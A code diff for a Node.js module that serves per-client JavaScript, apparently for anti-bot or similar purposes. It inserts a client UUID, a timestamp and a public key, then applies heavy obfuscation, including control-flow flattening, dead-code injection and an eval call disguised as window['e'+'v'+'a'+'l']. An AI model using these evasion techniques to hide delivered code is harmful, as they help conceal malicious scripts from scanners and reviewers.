@@ -9,6 +9,8 @@ const t = require('@babel/types');
 
 const JavaScriptObfuscator = require('javascript-obfuscator');
 
+const publicKey = "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAjoNVncIVsUAuW4RH75cYe6I3T7sHC54OmIU+eTYc/F1SDSCGtirBym4rgtGwwHLFhGaq6sLoI9BxbAwmoVMliWiBrRmatXhmPbqX7juRvLHPJ+9LHJp/eEQgSz7aef/zVrjzCpz0xD0Nh2o4Lg+ckXXgMBWID8btmwJwjLVHNj9J1hsEs0fk/iGmK1hCEYqX3Vosxue0sxLKzvyNDsNKdEL5NXpLSlHB2RWVa0+EFcieuLfVmMThe9NqUY5w9Zf3AYHvVpQuam2TJd0ht6jx MozpWrVwHVlHna+goRDBBV9mxzRBTxlwDgtgbZCO4YBmF2AbxSBnhnhtFboniHHtih19DeXQKsS5ZiOZr9/bcVNgvIfzvNuw/lrMTZCgz3i5XNQKBtQKPceohBxCA4Hg UEE6J5hgxjneJMlZRCc9XKFeTgFxmfuN1B+vSx9s+f7F4Wl9ri+8GawApznyJn8XzVHMrMZbTHcS1FVe\/\/nU/n0/nY1Qfs3XnQN4xhScHjnuvh8/fOvbNEWXplZOrj+JYTsjDb9Vs9basXTqYz284GNRrAwBIEOnXyu4fGOxiKv0ipCPs/RRxVVadA8tB0ReyZysEQ5PQ0Jhsf0jRZk/rrctMq/YqzyxG9aOGeM7vB/Pbgo88c/OUiZfaFP7T/vqdINs82/wC2/To4Y/ZFQ5BwsCAwEAAQ=="
+
 function generateRandomName() {
     // return random hex string like _0x38a2db
     return '_' + Math.random().toString(16).substr(2, 8);
@@ -358,8 +360,15 @@ function obfuscateStringsAndCalls(code) {
             }
         
             if (!path.parentPath.isObjectProperty({ key: path.node })) {
-                if (path.node.value) {
-                    path.replaceWith(unpackStringExpression(packString(path.node.value)));
+                // make sure temp vars like {{}} isn't in the string
+            
+                if(!path.node.value.includes('{{')){
+                    if (path.node.value) {
+                        path.replaceWith(unpackStringExpression(packString(path.node.value)));
+                    }
+                }
+                else{
+                    console.log(`Skipping ${path.node.value}`);
                 }
             }
         }
@@ -370,7 +379,13 @@ function obfuscateStringsAndCalls(code) {
 
 
 function obfuscateConstantVariables(code) {
-    const ast = parser.parse(code, { sourceType: "module" });
+    try{
+        var ast = parser.parse(code, { sourceType: "module" });
+    }
+    catch(e){
+        console.log(e);
+        return code;
+    }
     const newNodes = [];
 
     traverse(ast, {
@@ -379,6 +394,9 @@ function obfuscateConstantVariables(code) {
                 path.node.declarations.forEach(declaration => {
                     if (declaration.init) {
                         const originalName = declaration.id.name;
+                        if(originalName == undefined){
+                            return;
+                        }
                         const obfuscatedName = generateRandomName();
                         const originalValue = declaration.init;
 
@@ -403,6 +421,7 @@ function obfuscateConstantVariables(code) {
                                 t.identifier(obfuscatedName)
                             )
                         ]);
+
 
                         newNodes.push({ path: path, nodes: [assignValue, originalConst] });
                     }
@@ -488,7 +507,7 @@ function createEvalFunction(code) {
         t.blockStatement([
             t.returnStatement(
                 t.callExpression(
-                    t.identifier('eval'),
+                    t.identifier('window["e"+"v"+"a"+"l"]'),
                     [t.identifier('str')]
                 )
             )
@@ -503,33 +522,79 @@ function createEvalFunction(code) {
 
 
 
-async function obfuscateScript(data) {
+function obfuscateScript(data) {
 
     // return data;
 
-    // initial obfuscation
-    let timer = Date.now();
 
     data = JavaScriptObfuscator.obfuscate(data, {
         compact: true,
         controlFlowFlattening: true,
-        controlFlowFlatteningThreshold: 1,
-        numbersToExpressions: true,
-        simplify: true,
-        stringArrayShuffle: true,
-        splitStrings: true,
-        stringArrayThreshold: 1
+        controlFlowFlatteningThreshold: 0.75,
+        deadCodeInjection: true,
+        deadCodeInjectionThreshold: 0.4,
+        debugProtection: false,
+        debugProtectionInterval: 0,
+        disableConsoleOutput: true,
+        domainLock: [],
+        domainLockRedirectUrl: 'about:blank',
+        forceTransformStrings: [],
+        identifierNamesCache: null,
+        identifierNamesGenerator: 'hexadecimal',
+        identifiersDictionary: [],
+        identifiersPrefix: '',
+        ignoreImports: false,
+        inputFileName: '',
+        log: false,
+        numbersToExpressions: false,
+        optionsPreset: 'default',
+        renameGlobals: true,
+        renameProperties: false,
+        renamePropertiesMode: 'safe',
+        reservedNames: [],
+        reservedStrings: [],
+        seed: 0,
+        selfDefending: false,
+        simplify: false,
+        sourceMap: false,
+        sourceMapBaseUrl: '',
+        sourceMapFileName: '',
+        sourceMapMode: 'separate',
+        sourceMapSourcesMode: 'sources-content',
+        splitStrings: false,
+        splitStringsChunkLength: 10,
+        stringArray: false,
+        stringArrayCallsTransform: false,
+        stringArrayCallsTransformThreshold: 0.5,
+        stringArrayEncoding: [],
+        stringArrayIndexesType: [
+            'hexadecimal-number'
+        ],
+        stringArrayIndexShift: false,
+        stringArrayRotate: false,
+        stringArrayShuffle: false,
+        stringArrayWrappersCount: 1,
+        stringArrayWrappersChainedCalls: false,
+        stringArrayWrappersParametersMaxCount: 2,
+        stringArrayWrappersType: 'variable',
+        stringArrayThreshold: 0.75,
+        target: 'browser',
+        transformObjectKeys: false,
+        unicodeEscapeSequence: false
     }).getObfuscatedCode();
 
 
     // remove all comments
     data = data.replace(/\/\*[\s\S]*?\*\/|([^\\:]|^)\/\/.*$/gm, '');
 
+    // replace all // with \/\/
+    data = data.replaceAll('//', '\\/\\/');
+
     // Start with foundational transformations
-    // data = obfuscateConstantVariables(data);
+    data = obfuscateConstantVariables(data);
 
     // Obfuscate object keys
-    // data = obfuscateObjectKeys(data); // <-- Inserted here
+    data = obfuscateObjectKeys(data); // <-- Inserted here
 
     // Proxy functions and control flow changes
     data = createProxyFunctions(data);
@@ -537,23 +602,24 @@ async function obfuscateScript(data) {
     data = obfuscateVariableNames(data);
 
 
-    // Add complexity with dead code and string/call obfuscations
+    // // Add complexity with dead code and string/call obfuscations
     data = addDeadCodeBranches(data);
     data = obfuscateStringsAndCalls(data);
 
     // Finalize by hiding specific function calls
-    data = hideFunctionCalls(data);
+    // data = hideFunctionCalls(data);
 
-    // data = obfuscateControlFlow(data);
+    data = obfuscateControlFlow(data);
 
     
 
 
     // // Replace eval with a function call
-    // data = repaceEval(data);
+    data = repaceEval(data);
 
-    // data = createEvalFunction(data);
+    data = createEvalFunction(data);
 
+    data = data.replace("{{PUBLIC_KEY}}", publicKey);
 
     return data;
 }
@@ -571,9 +637,10 @@ async function getScript(clientIdentifier){
     data = data.replaceAll('{{UUID}}', clientIdentifier);
     data = data.replaceAll('{{ST}}', Date.now());
 
-    return data;
 
-    // return obfuscateScript(data);
+    // return data;
+
+    return await obfuscateScript(data);
 }
 
 module.exports = {
